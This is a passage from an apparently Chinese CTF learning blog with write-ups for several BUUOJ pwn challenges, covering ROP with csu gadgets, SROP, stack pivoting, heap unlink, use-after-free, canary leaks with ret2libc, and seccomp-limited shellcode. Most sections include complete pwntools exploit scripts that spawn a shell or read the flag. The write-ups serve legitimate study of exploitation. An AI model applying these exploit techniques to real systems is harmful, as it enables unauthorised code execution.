title="12.ciscn_s_3"></a>12.ciscn_s_3</h2><ol><li><p>checksec</p><p><img src="https://i.loli.net/2021/08/06/Exk1cpHYvmls4fJ.png" alt="image-20210806154145249"></p></li><li><p>main函数里面只有vuln, vuln函数里就是简单的sysread syswrite, 都是通过syscall以及系统调用号来执行的</p><img src="https://i.loli.net/2021/08/06/SP7dTJbw4XCQBDm.png" alt="image-20210806154501028" style="zoom:80%;" /> <p>gadgets函数:</p><img src="https://i.loli.net/2021/08/06/OiYpf1UhETLPwo5.png" alt="image-20210806154658559" style="zoom:80%;" /> </li><li><p>最重要的两点</p><ul><li>这两个函数<strong>都不以leave结尾</strong>, 意味着函数结束后没有恢复到之前的栈帧, 进入函数时的ebp的位置即为返回地址, 所以IDA中栈分析是错误的, <strong>真实栈结构还得看汇编代码</strong> </li><li><strong>第一种办法:</strong> 看见了一个mov rax, <strong>3B</strong>h    retn, 代表着我们可以利用这两行代码为执行sys_execve做准备</li><li><strong>第二种办法:SROP</strong> </li><li>下面先用第一种方法.</li></ul></li><li><p>从反汇编代码中看出sys_read几乎无限长字节(0x400), sys_write30个单位, 有明显的栈溢出, 这里我们使用59号系统调用(64位), 构造</p><p><code>execve(&#39;/bin/sh&#39;，0，0）</code> </p><p>但是程序中并未发现/bin/sh, 所以需要手动输入, 新问题是sys_read后<strong>我们的字符串</strong>在什么地址上? 所以需要<strong>leak</strong>出某一个有用的地址</p></li><li><p>gdb调试:</p><p>b vuln-&gt;run-&gt;continue-&gt; aaaaaaaaa(测试输入)-&gt;发现栈的<u>基地址</u> </p><ul><li><p>不得不说的就是这个<strong>栈的基地址</strong>, 一般是main函数参数中argv[0]即文件的路径, gdb中会写成这个样子</p><p> <code>0xffffd0ec —▸ 0xffffd204 —▸ 0xffffd3c4 ◂— &#39;/root/Desktop/fm&#39;</code> </p><p> 取第一次解引用的地址即为栈的基地址, 减去rsp得到<strong>0x118</strong> </p><p> 栈的基地址长这样子, 有path的那条就是, 下面一大串的是环境变量envp</p> <img src="https://i.loli.net/2021/08/06/R2XcmJiCe7lG3Lo.png" alt="image-20210806235944050" style="zoom: 80%;" /> </li></ul></li><li><p><strong>要注意的是,</strong> pop指令弹出的是栈上指针对应地址的数据, 平时栈溢出填充的很容易以为直接就是数据, 实际上在这种情况下应该写成一个地址, 指向payload中后面的参数, 如下sh+0x50指向mov_rax</p><p><img src="https://i.loli.net/2021/08/07/j9ZSDorqgbEfGvy.png"> </p></li><li><p>详细注释:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import*</span><br>context.binary = <span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span><br>context.log_level= <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>rn=<span class="hljs-keyword">lambda</span> x:io.recv (x)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, xxxxx)<br>vuln=<span class="hljs-number">0x4004ed</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>csu_end=<span class="hljs-number">0x40059a</span><br>csu_front=<span class="hljs-number">0x400580</span><br>mov_rax=<span class="hljs-number">0x4004e2</span><br>syscall=<span class="hljs-number">0x400517</span><br><span class="hljs-comment">#第一次的目的是leak基地址, 填上数组的16字节即可, 返回地址继续回到vuln</span><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(vuln)<br>sl(payload)<br>rn(<span class="hljs-number">0x20</span>)<br>binsh=u64(rn(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-comment">#        输入binsh     填完数组  即csuend      即mov_rax地址   rbx,rbp填为0    r13-r15全为0</span><br>payload= <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>+ p64(<span class="hljs-number">0</span>)+  p64(csu_end)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+      p64(binsh+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br><span class="hljs-comment">#即csufront     ROPgadget    execve首参数  mov系统调用号   最后syscall59执行execve   </span><br>+p64(csu_front)+p64(pop_rdi)+p64(binsh)+  p64(mov_rax)+  p64(syscall) <br><br>sl(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p> <strong>附: SROP<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">[CTF-WiKi]</a></strong> <strong>[<a href="https://blog.csdn.net/qinying001/article/details/104291387">writeup</a>]</strong> </p><ul><li><p>简单说来SROP就是调用sigreturn函数改写所有寄存器的值, 然后再执行rip指向的地址</p><p>本题中流程为: 泄露栈基地址-&gt;构造frame = SigreturnFrame()-&gt;填满数组, mov调用号15, syscall地址, bytes(frame)</p></li></ul><h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>看了老半天源代码和基础知识</p><p>估摸着我得过几天复习复习, 可不能忘记了</p><p><a href="https://blog.csdn.net/huzai9527/article/details/114807930?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.base&spm=1001.2101.3001.4242">别人的详细的wp</a>  <a href="https://bbs.pediy.com/thread-223461.htm">看雪 不太详细</a> </p><h2 id="14-Black-Watch-入群题-PWN"><a href="#14-Black-Watch-入群题-PWN" class="headerlink" title="14.[Black Watch 入群题]PWN"></a>14.[Black Watch 入群题]PWN</h2><p>又是一种没见过的方法, 名为<strong>栈转移</strong>, 用于栈溢出不够, 以leave ret结尾, 有或能够向bss段写入数据的, 将<strong>rsp</strong>转移到<strong>bss</strong>段</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">leave = mov rsp, rbp pop rbp    <br>ret =  pop rip<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs flow">st=&gt;parallel: 流程:<br>opa1=&gt;start: 填满栈上数组, <br>覆盖ebp为bss段某一地址<br>opa2=&gt;start: 修改返回地址为leave&amp;ret的gadget<br>opb1=&gt;start: 往bss写入4字节数据作为第二次 pop rbp<br>opb2=&gt;start: 如果未知sys,/bin/sh等地址<br>可用此次leak地址然后在下一次执行system函数<br>a=&gt;parallel: 结束<br>st(path1, left)-&gt;opa1-&gt;opa2<br>st(path2, right)-&gt;opb1-&gt;opb2<br>opa2-&gt;a<br>opb2-&gt;a<br><br></code></pre></div></td></tr></table></figure><p>…</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;./spwn&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25611</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;spwn&quot;</span>)<br><br>bss_s = <span class="hljs-number">0x0804A300</span><span class="hljs-comment">#将fake栈迁移到bss中</span><br>leave_ret = <span class="hljs-number">0x08048511</span><span class="hljs-comment">#栈迁移所需要的的地址</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#plt表可以调用write函数</span><br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#got表里有write函数的真实地址</span><br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<span class="hljs-comment">#控制函数执行流需要再次回到主函数</span><br><span class="hljs-comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><span class="hljs-comment"># 上面将一些执行流程写入了bss段</span><br><span class="hljs-comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> <span class="hljs-comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span><br>payload += p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#接收泄露的地址</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write_addr) <span class="hljs-comment">#利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span><br>libc_base = write_addr - libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<span class="hljs-comment">#获取libc的基地址</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span><br><span class="hljs-comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)<br>payload += p32(binsh_addr)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> + p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="15-easyheap"><a href="#15-easyheap" class="headerlink" title="15.easyheap"></a>15.easyheap</h2><p><strong>exp:</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br>sh = remote(<span class="hljs-string">&quot;slkdfjsldkf&quot;</span>, <span class="hljs-number">932487</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system_plt=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>context.binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>ptr=<span class="hljs-number">0x6020e8</span><span class="hljs-comment"># heaparray[1]的指针的地址</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap:&quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, size, content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap : &quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><span class="hljs-comment">#创建三个chunk</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#使用unlink修改heaparray</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)<br>payload+=p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>sh.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>最妙之处在于将free_got改为system_got, 然后又因为free和system都是指针类型, 只要伪造一个字符串指针就可以用free来执行system</li><li>主要步骤:<ul><li>在chunk1的user date里造一个fake chunk header, 注意到chunk2的PREV_SIZE被修改为20, inuse_bit为0, 以及设置”空”chunk的fd和bk指针, 以避开FD-&gt;bk == BK-&gt;fd == victim的检查</li><li>这样释放chunk2之后unlink就会使用<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>后向合并, chunk1的user date变成另一个chunk, 并修改heaparray[1]为FD(ptr-0x18)</li><li>再次编辑chunk1, 由于heaparray[1]已经指向ptr-0x18, 所以填充两个64位0, 将[0]覆盖为free_got表的地址, [1]指向FD, [2]指向后8字节的”bin/sh”</li><li>编辑heaparray[0], 修改free_got的值为system_got</li><li>然后delete(2), 这时调用system_got, 参数是存储在该位置的指针, 值为binsh的地址, 成功执行</li></ul></li></ul><img src="https://i.loli.net/2021/08/19/VePjdSGNFOpEM6o.png" alt="654" style="zoom:50%;" /> <h2 id="16-hacknote"><a href="#16-hacknote" class="headerlink" title="16.hacknote"></a>16.hacknote</h2><p>比较简单的一道heap题, 主要是UAF</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29324</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>  r.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>mag = elf.sym[<span class="hljs-string">&quot;magic&quot;</span>]<br>add(<span class="hljs-number">12</span>, p32(mag)) <span class="hljs-comment">#2</span><br>printf(<span class="hljs-number">1</span>)<br>r.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="17-bjdctf-2020-babyrop2"><a href="#17-bjdctf-2020-babyrop2" class="headerlink" title="17.bjdctf_2020_babyrop2"></a>17.bjdctf_2020_babyrop2</h2><p>这题是leak canary + return2libc, 这个值好像不会变呐, 我再去查查</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./bjdctf_2020_babyrop2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29934</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br><span class="hljs-comment">#</span><br>elf = ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>vuln = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400993</span><br><br>sla(<span class="hljs-string">&#x27;u!\n&#x27;</span>, <span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rn(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, puts_got, puts_plt, vuln])<br>sla(<span class="hljs-string">&#x27;ry!\n&#x27;</span>, payload)<br><br>puts_addr = u64(rn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, binsh, sys])<br>sl(payload)<br>sl(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="18-pwnable-orw"><a href="#18-pwnable-orw" class="headerlink" title="18.pwnable_orw"></a>18.pwnable_orw</h2><p>看上去像是很简单的shellcraft, 但是第一个函数就有点特别了:</p><p><img src="https://i.loli.net/2021/09/14/vONRPQkUxKWjALD.png" alt="image-20210914223414394"></p><ul><li>seccomp()函数查看</li><li>使用seccomp-tools:</li></ul><p><img src="https://i.loli.net/2021/09/14/oTh3rR9IzGwv6aC.png" alt="image-20210914223259160"></p><ul><li>看出仅可使用open, read, write这几个有用的函数</li><li>exp: (<a href="https://cloud.tencent.com/developer/article/1815026">这里是手写汇编调用syscall</a>)</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node.buuoj.cn&#x27;</span>,<span class="hljs-number">25539</span>)<br><br>context.binary = <span class="hljs-string">&#x27;./orw&#x27;</span><br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#读取到栈中</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#打在标准输出上</span><br>shellcode = asm(shellcode)<br><br>sleep(<span class="hljs-number">0.2</span>)<span class="hljs-comment">#意义不明</span><br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>新机制: seccomp</strong> </p><blockquote><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p></blockquote><p><img src="https://i.loli.net/2021/09/13/ekGP6w4rBUmzyFn.png" 